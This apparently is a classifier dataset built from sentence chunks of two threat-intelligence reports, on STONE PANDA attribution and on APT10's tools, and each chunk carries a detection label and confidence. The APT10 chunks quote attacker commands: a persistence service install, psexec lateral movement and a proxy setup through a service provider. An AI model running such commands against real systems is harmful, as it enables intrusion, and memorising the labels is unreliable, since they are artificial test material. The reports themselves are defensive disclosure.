        "text": "No records could be found for such a firm, however, IntrusionTruth lists the address associated with it as Room 1102, Guanfu Mansion, 46 Xinkai Road, Hedong District, Tianjin (\u5929\u6d25\u5e02\u6cb3\u4e1c\u533a\u65b0\u5f00\u8def46\u53f7\u51a0\u798f\u5927\u53a61102). \n  During the course of investigating Laoying and the Guanfu mansion, Falcon Intelligence noticed that the Guanfu Mansion is also the registered address of a firm called Tianjin Henglide Technology Co., Ltd. (\u6052\u5229\u5fb7\u5929\u6d25\u79d1\u6280\u6709\u9650\u516c\u53f8), which is listed as one of only a few \u201creview centers\u201d certified by CNITSEC in Tianjin5.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.3341384828090668
        },
        "prediction": {}
    },
    {
        "text": "Laoying and Henglide are listed as being on different floors, however having a CNITSEC review center in the same building is noteworthy given CNITSEC\u2019s connection to MSS and previous linkage to Boyusec/GOTHIC PANDA.\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6084798574447632
        },
        "prediction": {}
    },
    {
        "text": "Zhang is believed to have taken the photo of the fire from the Wanchan Meizhuan Mansion.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.7192464470863342
        },
        "prediction": {}
    },
    {
        "text": "This is relatively close to both the Yuyang Complex (one of Zhang\u2019s listed registrant addresses) and the Guanfu Mansion, Laoying Baichen\u2019s listed address.\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6504823565483093
        },
        "prediction": {}
    },
    {
        "text": "Tianjin Huaying Haitai Science and Technology Development Company \nThe other firm GAO appears to have been recruiting for is Huaying Haitai (\u5929\u6d25\u534e\u76c8\u6d77\u6cf0\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8).",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5648459792137146
        },
        "prediction": {}
    },
    {
        "text": "As the IntrusionTruth blog post mentions, it is a registered firm with two listed representatives, Fang Ting (\u65b9\u4ead) and Sun Lei (\u5b59\u6770), and a listed address of 1906 Fuyu Mansion (\u5929\u6d25\u5e02\u6cb3\u897f\u533a\u89e3\u653e\u5357\u8def\u4e2d\u6bb5\u897f\u4fa7\u5bcc\u88d5\u5927\u53a61-1906). \n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.44171416759490967
        },
        "prediction": {}
    },
    {
        "text": "One is a recruitment Excel sheet detailing recent graduates, their majors and their new employers and addresses.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6573181748390198
        },
        "prediction": {}
    },
    {
        "text": "Huaying Haitai is listed as having hired a recently graduated female student from Nankai University in 2013 who majored in Japanese. This is interesting considering STONE PANDA\u2019s extensive targeting of Japanese defense firms after this time period, but it is by no means conclusive evidence that the firm is connected to STONE PANDA.\n\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5868580937385559
        },
        "prediction": {}
    },
    {
        "text": "The second government document lists Huaying Haitai as the co-organizer of a Network Security Attack and Defense competition with the Ministry of Industry and Information Technology\u2019s (MIIT) national training entity, NSACE6.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.624836802482605
        },
        "prediction": {}
    },
    {
        "text": "NSACE appears to be a national education body that teaches network information security, including offensive activity7.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.599456787109375
        },
        "prediction": {}
    },
    {
        "text": "This information is particularly interesting given Boyusec\u2019s previous work at CNITSEC\u2019s Guangdong subsidiary setting up a joint active defense lab8. \u00a0",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6536117196083069
        },
        "prediction": {}
    },
    {
        "text": "It suggests that these technology firms act as both shell companies and recruitment grounds for potential MSS use in cyber operations.\n\n MSS Tianjin Bureau\nThe most recent IntrusionTruth post assesses that GAO\u2019s Uber rides frequently took him from Huaying\u2019s address at the Fuyu Mansion to 85 Zhujiang Road (\u73e0\u6c5f\u905385\u53f7). \n\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5308004021644592
        },
        "prediction": {}
    },
    {
        "text": "When observed closely, the compound is a striking one complete with towers, a fenced perimeter with surveillance cameras, guarded entrances, and a building with a significant number of satellite dishes.\n\n There are no markers on the building and no government listed address; however, it is apparently difficult for locals to determine where the Tianjin Bureau\u2019s location is as well.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6187580227851868
        },
        "prediction": {}
    },
    {
        "text": "There are several Baidu questions asking what transportation routes are best to get to that specific address.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5659404397010803
        },
        "prediction": {}
    },
    {
        "text": "Three separate ones specifically mention the 85 Zhujiang Road address as the headquarters for the MSS\u2019s Tianjin Bureau and the difficulty in finding its location9 10 11.\n\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.728241503238678
        },
        "prediction": {}
    },
    {
        "text": "As with most cyber-enabled operations, satellite arrays are often indicative of installations with significant signals intelligence (SIGINT) capabilities.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.521694540977478
        },
        "prediction": {}
    },
    {
        "text": "The Tianjin Bureau appears to have the potential for such capabilities, housing several large arrays that appear to have existed since at least January 2004.\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6928302049636841
        },
        "prediction": {}
    },
    {
        "text": "Barely visible satellite dishes from the street view of 85 Zhujiang Road outside the compound\nConclusion\nThere are still significant intelligence gaps that prevent Falcon Intelligence from making an assessment about STONE PANDA\u2019s potential connections to the MSS Tianjin Bureau with a high degree of confidence. However, additional information is likely to materialize either directly from IntrusionTruth or from other firms in the infosec community who are undoubtedly looking at this material as well and may have unique insight of their own. Ultimately, IntrusionTruth\u2019s prior releases on GOTHIC PANDA proved accurate and led to a U.S. Department of Justice indictment resulting in the dismantling of Boyusec. From their latest post, which contains GAO\u2019s Uber receipts, it is clear the group\u2019s information likely goes beyond merely available OSINT data. \n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.46789950132369995
        },
        "prediction": {}
    },
    {
        "text": "It cannot be ignored that there are striking similarities between the entities associated with GOTHIC PANDA and the actors and firms mentioned in the blogs about STONE PANDA.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.697350025177002
        },
        "prediction": {}
    },
    {
        "text": "In addition, FalconIntelligence notes that following the late 2015 Sino-U.S. brief cyber detente, much of the responsibility for western cyber intrusion operations was handed to the MSS as the PLA underwent an extensive reform that is still currently underway, and which is consolidating its military cyber forces under the Strategic Support Force. \n Though the detente saw an initial drop in Chinese intrusion activity, it has steadily been increasing over the past several years, with a majority of the intrusions into western firms being conducted by suspected contractors.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.44174230098724365
        },
        "prediction": {}
    },
    {
        "text": "These adversaries are tracked by CrowdStrike as GOTHIC PANDA, STONE PANDA, WICKED PANDA, JUDGMENT PANDA, and KRYPTONITE PANDA.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.4310751259326935
        },
        "prediction": {}
    },
    {
        "text": "Many of these adversaries have begun targeting supply chain and upstream providers to establish a potential platform for future operations and enable the collection of larger sets of data.\n While the APT1, PUTTER PANDA, and Operation CameraShy reports all exposed PLA units at a time when Chinese military hacking against western firms was rampant, the attention has now swung toward identifying MSS contractors. The exposure of STONE PANDA as an MSS contractor would be another blow to China\u2019s current cyber operations given STONE PANDA\u2019s prolific targeting of a variety of sectors, and may prompt an additional U.S. investigation at a tenuous time for Sino-U.S. relations during an ongoing trade war.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.46372899413108826
        },
        "prediction": {}
    },
    {
        "text": "However, it is important to note that such public revelations often force these actors to cease operations, improve their operational security (OPSEC), and then return stronger than before. As such, CrowdStrike Falcon\u00ae Intelligence assesses that although Boyusec may have shuttered, elements of GOTHIC PANDA are likely to still be active.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.43556123971939087
        },
        "prediction": {}
    },
    {
        "text": "The same is likely to be true for STONE PANDA following a period of silence. \u00a0\u00a0\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.7231559157371521
        },
        "prediction": {}
    },
    {
        "text": "The activities of STONE PANDA impact entities in the Aerospace & Defense, Government, \u00a0Healthcare, Technology, \u00a0Telecommunications Services of several nations. \n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5909602642059326
        },
        "prediction": {}
    },
    {
        "text": "For more information on how to incorporate intelligence on threat actors like STONE PANDA into your security strategy, please visit the Falcon Intelligence product page.\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.669453501701355
        },
        "prediction": {}
    },
    {
        "text": "Footnotes\n\nhttp://kjbz.mca.gov[.]cn/article/mzbzhzcwj/201106/20110600157934.shtml\nhttp://bjgwql[.]com/a/hezuojiaoliu/2011/0422/288.htm\nhttp://alumni.ecnu.edu[.]cn/s/328/t/528/3b/02/info80642.htm\nhttp://down.51cto[.]com/424761/down/1/\nhttp://www.djbh[.]net/webdev/web/LevelTestOrgAction.do?p=nlbdLv3&id=402885cb35d11a540135d168e41e000c\nhttp://rjzyjsxy.zzia.edu[.]cn/picture/article/25/27/01/6c8b24a143f9959a85301d4527f0/801f81cf-8f30-4aa4-8428-7f9d4e778e76.doc\nhttp://www.yingjiesheng[.]com/job-001-607-536.html\nhttps://www.recordedfuture.com/chinese-mss-behind-apt3/\nhttps://zhidao.baidu[.]com/question/1046720364336588899.html?fr=iks&word=%CC%EC%BD%F2%CA%D0%D6%E9%BD%AD%B5%C085%BA%C5%CA%C7%CA%B2%C3%B4%B5%A5%CE%BB%C2%EF&ie=gbk\nhttps://zhidao.baidu[.]com/question/146035392.html?fr=iks&word=%CC%EC%BD%F2%CA%D0%D6%E9%BD%AD%B5%C085%BA%C5%CA%C7%CA%B2%C3%B4%B5%A5%CE%BB%C2%EF&ie=gbk\nhttps://zhidao.baidu[.]com/question/223614321.html?fr=iks&word=%CC%EC%BD%F2%CA%D0%D6%E9%BD%AD%B5%C085%BA%C5%CA%C7%CA%B2%C3%B4%B5%A5%CE%BB%C2%EF&ie=gbk\n\n\n\n\n\n\n\nTweet\n\n\n\n\n\nShare\n\n\n\n\n\nRelated Content\n\n\n\n\n\n\n5 Tips to Defend Against Access Brokers This Holiday Season\n\n\n\n\n\n\n\n\nIMPERIAL KITTEN",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.06608247756958008
        },
        "prediction": {}
    },
    {
        "text": "Deploys Novel Malware Families in Middle East-Focused Operations\n\n\n\n\n\n\n\n\nAutomation Advancements in Falcon Intelligence Recon: Disrupt the Adversary and Reduce Risk\n\n\n\n\n\n\n\n\n\nCONNECT WITH US\n\n\n\n\n\n\n\n\n\n\n\n\n\nFeatured Articles\n\nCrowdStrike Named a Leader with a \u201cStellar\u201d MDR Offering in The Forrester Wave\u2122: Managed Detection and Response Services in Europe, Q4 2023\nDecember 14, 2023\n\n\nDecember 2023 Patch Tuesday: 34 Vulnerabilities Including One Previously Disclosed Zero-Day\nDecember 12, 2023\n\n\nIdentity Threat Hunting: How CrowdStrike Counter Adversary Operations Is Leading the Charge\nDecember 11, 2023\n\n\n CrowdStrike Discovers Vulnerability in Flexera\u2019s FlexNet Inventory Agent (CVE-2023-29082)\nDecember 8, 2023\n\n\n\n\nSUBSCRIBE\nSign up now to receive the latest notifications and updates from CrowdStrike.\n Sign Up\n\n\n\n\nSee CrowdStrike Falcon\u00ae in Action\nDetect, prevent, and respond to attacks\u2014 even malware-free intrusions\u2014at any stage, with next-generation endpoint protection.\n See Demo\n\n\n\n\n\n Meet CrowdStrike\u2019s Adversary of the Month for August: GOBLIN PANDA\nKovter Killer: How to Remediate the APT of Clickjacking \n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCopyright \u00a9 2023 CrowdStrike\nPrivacy\nRequest Info\nBlog\nContact Us\n1.888.512.8906\n\n\n\n\n\n\n\n\n\n\n\n\n\nCookie Preference CenterYour PrivacyStrictly Necessary CookiesFunctional CookiesPerformance CookiesTargeting CookiesYour",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.3055085837841034
        },
        "prediction": {}
    },
    {
        "text": "PrivacyWhen you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5873335599899292
        },
        "prediction": {}
    },
    {
        "text": "Because we respect your right to privacy, you can choose not to allow some types of cookies.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5173817873001099
        },
        "prediction": {}
    },
    {
        "text": "Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.\u00a0\n            ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6802705526351929
        },
        "prediction": {}
    },
    {
        "text": "Strictly Necessary CookiesAlways ActiveThese cookies are necessary for the website to function and cannot be switched off in our systems.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6504963636398315
        },
        "prediction": {}
    },
    {
        "text": "This includes diagnostic functions such as identifying 404 errors and monitoring page load speed. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.517471969127655
        },
        "prediction": {}
    },
    {
        "text": "You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5944161415100098
        },
        "prediction": {}
    },
    {
        "text": "Cookies Details\u200eFunctional Cookies  Functional Cookies These cookies enable the website to provide enhanced functionality and personalisation.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.7160791158676147
        },
        "prediction": {}
    },
    {
        "text": "They may be set by us or by third party providers whose services we have added to our pages.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5347203612327576
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies then some or all of these services may not function properly.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.4902583956718445
        },
        "prediction": {}
    },
    {
        "text": "These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move around the site.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6638591289520264
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.4701407849788666
        },
        "prediction": {}
    },
    {
        "text": "These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5700152516365051
        },
        "prediction": {}
    },
    {
        "text": "They do not store directly personal information, but are based on uniquely identifying your browser and internet device.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5441780686378479
        },
        "prediction": {}
    },
    {
        "text": "Cookies Details\u200eBack ButtonBackSearch  Filter ButtonConsent Leg. Interest checkbox label label checkbox label label checkbox label labelEmpty headingEmpty headingView Third Party CookiesNamecookie nameClear checkbox label labelApply CancelConfirm My Choices Allow All",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.3958796560764313
        },
        "prediction": {}
    },
    {
        "text": "\n\nAPT10 MenuPass Group | New Tools & New Global Campaignmandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.5587565898895264
        },
        "prediction": {}
    },
    {
        "text": "If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6290023922920227
        },
        "prediction": {}
    },
    {
        "text": "Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology. Explore the platformarrow_forward Start with free account   Attack Surface Management Free\u00a0Subscription Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Free\u00a0Subscription Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services. Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward   Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.32092228531837463
        },
        "prediction": {}
    },
    {
        "text": "Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Create a free accountSign in to Advantage  en  expand_more   English Fran\u00e7ais Deutsch Italiano \u65e5\u672c \ud55c\uad6d\uc5b4 Espa\u00f1olStart for Free        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewBreach Analytics for ChronicleSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.3858955502510071
        },
        "prediction": {}
    },
    {
        "text": "If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.4152478873729706
        },
        "prediction": {}
    },
    {
        "text": "Gives BackNoteholder and Preferred Shareholder DocumentsMobile Footer SectionSee what\u2019s new at MandiantGet startedIncident Response HelpContact SalesSupportSign InCreate a Free Mandiant Advantage AccountTop Incident Response Contact sales Support Advantage Free Trial \u00a0BlogSupportContact usreport_problemIncident Response Assistance    Breadcrumb Home APT10 (MenuPass Group): New Tools, Global Campaign Latest Manifestation of Longstanding Threat   Threat Research APT10 (MenuPass Group): New Tools, Global Campaign Latest Manifestation of Longstanding ThreatFireEye iSIGHT Intelligence Apr 06, 20175 min\u00a0read |\u00a0\u00a0  Last updated: Nov 29, 2023 APT10 BackgroundAPT10 (MenuPass Group) is a Chinese cyber espionage group that FireEye has tracked since 2009.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.3379638195037842
        },
        "prediction": {}
    },
    {
        "text": "They have historically targeted construction and engineering, aerospace, and telecom firms, and governments in the United States, Europe, and Japan.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.49643203616142273
        },
        "prediction": {}
    },
    {
        "text": "We believe that the targeting of these industries has been in support of Chinese national security goals, including acquiring valuable military and intelligence information as well as the theft of confidential business data to support Chinese corporations. PwC and BAE recently issued a joint blog detailing extensive APT10 activity. APT10\u2019s ResurgenceIn June 2016, FireEye iSIGHT intelligence first reported that APT10 expanded their operations.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.5146093368530273
        },
        "prediction": {}
    },
    {
        "text": "The group was initially detected targeting a Japanese university, and more widespread targeting in Japan was subsequently uncovered.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6886332035064697
        },
        "prediction": {}
    },
    {
        "text": "Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques. Global Targeting Using New ToolsLeveraging its global footprint, FireEye has detected APT10 activity across six continents in 2016 and 2017. APT10 has targeted or compromised manufacturing companies in India, Japan and Northern Europe; a mining company in South America; and multiple IT service providers worldwide.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.4531930088996887
        },
        "prediction": {}
    },
    {
        "text": "We believe these companies are a mix of final targets and organizations that could provide a foothold in a final target.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6889122128486633
        },
        "prediction": {}
    },
    {
        "text": "In addition to the continued use of SOGU, the current wave of intrusions has involved new tools we believe are unique to APT10. HAYMAKER and SNUGRIDE have been used as first stage backdoors, while BUGJUICE and a customized version of the open source QUASARRAT have been used as second stage backdoors. These new pieces of malware show that APT10 is devoting resources to capability development and innovation. HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.42610278725624084
        },
        "prediction": {}
    },
    {
        "text": "It also conducts basic victim profiling activity, collecting the computer name, running process IDs, %TEMP% directory path and version of Internet Explorer. It communicates encoded system information to a single hard coded command and control (C2) server, using the system\u2019s default User-Agent string.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.5906912684440613
        },
        "prediction": {}
    },
    {
        "text": "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it. That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.624602735042572
        },
        "prediction": {}
    },
    {
        "text": "BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2. It has the capability to find files, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6054676175117493
        },
        "prediction": {}
    },
    {
        "text": "SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests. Messages are encrypted using AES with a static key. The malware\u2019s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6362512707710266
        },
        "prediction": {}
    },
    {
        "text": "The versions used by APT10 (1.3.4.0, 2.0.0.0, and 2.0.0.1) are not available via the public GitHub page, indicating that APT10 has further customized the open source version.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6196528673171997
        },
        "prediction": {}
    },
    {
        "text": "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6655333638191223
        },
        "prediction": {}
    },
    {
        "text": "QUASARRAT is a fully functional .NET backdoor that has been used by multiple cyber espionage groups in the past.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6370276808738708
        },
        "prediction": {}
    },
    {
        "text": "Traditional and Novel MethodsThis recent APT10 activity has included both traditional spear phishing and access to victim\u2019s networks through service providers. (For more information on infection via service providers see M-Trends 2016).",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.46037960052490234
        },
        "prediction": {}
    },
    {
        "text": "APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g. \u201c[Redacted]_Group_Meeting_Document_20170222_doc_.exe) and in some cases simply identically named decoy documents and malicious launchers within the same archive. In addition to the spear phishes, FireEye ISIGHT Intelligence has observed APT10 accessing victims through global service providers. Service providers have significant access to customer networks, enabling an attacker who had compromised a service provider to move laterally into the network of the service provider\u2019s customer. In addition, web traffic between a service provider\u2019s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily. A notable instance of this observed by FireEye involved a SOGU backdoor that was set to communicate with its C2 through a server belonging to the victim\u2019s service provider. APT10 actors issued the following commands to a SOGU implant at a victim:sc create CorWrTool binPath= \"\\\"C:\\Windows\\vss\\vixDiskMountServer.exe\\\"\" start= auto displayname= \"Corel Writing Tools Utility\" type= ownsc description",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.2372596263885498
        },
        "prediction": {}
    },
    {
        "text": "[Redacted]psexec.exe <orghost> d.exenet view /domain:[Redacted]proxyconnect - \"port\": 3389, \"server\": \"[IP Address Redacted]\"These commands included setting persistence on the victim\u2019s system.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.4483907222747803
        },
        "prediction": {}
    },
    {
        "text": "The actor then tested connectivity to an IP managed by the victim\u2019s service provider. Once connectivity to the service provider IP was verified, the actor established the service provider IP as a proxy for the victim\u2019s SOGU backdoor. This effectively routes SOGU malware traffic through the victim\u2019s service provider, which likely indicates a foothold on the service provider\u2019s network.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6722567081451416
        },
        "prediction": {}
    },
    {
        "text": "The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.691123366355896
        },
        "prediction": {}
    },
    {
        "text": "ImplicationsAPT10 is a threat to organizations worldwide. Their abuse of access to service provider networks demonstrates that peripheral organizations continue to be of interest to a malicious actor \u2013 especially those seeking alternative angles of attack. We believe the pace of APT10 operations may slow following the public disclosure by the PwC/BAE blog; however, we believe they will return to their large-scale operations, potentially employing new tactics, techniques and procedures.\u00a0 ",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.5521153807640076
        },
        "prediction": {}
    },
    {
        "text": "Link to RSS feedPrepare for 2024's cybersecurity landscape. Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon.",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": true,
            "confidence": 0.6609247922897339
        },
        "prediction": {}
    },
    {
        "text": "Mandiant Advantage Platform Platform Overview Breach Analytics for Chronicle Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Noteholder and Preferred Shareholder Documents Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Email Preferences Customer Success Media Inquiries",
        "source": "APT10 MenuPass Group _ New Tools & New Global Campaign.html",
        "detection": {
            "response": false,
            "confidence": 0.2693336009979248
        },
        "prediction": {}
    },
    {
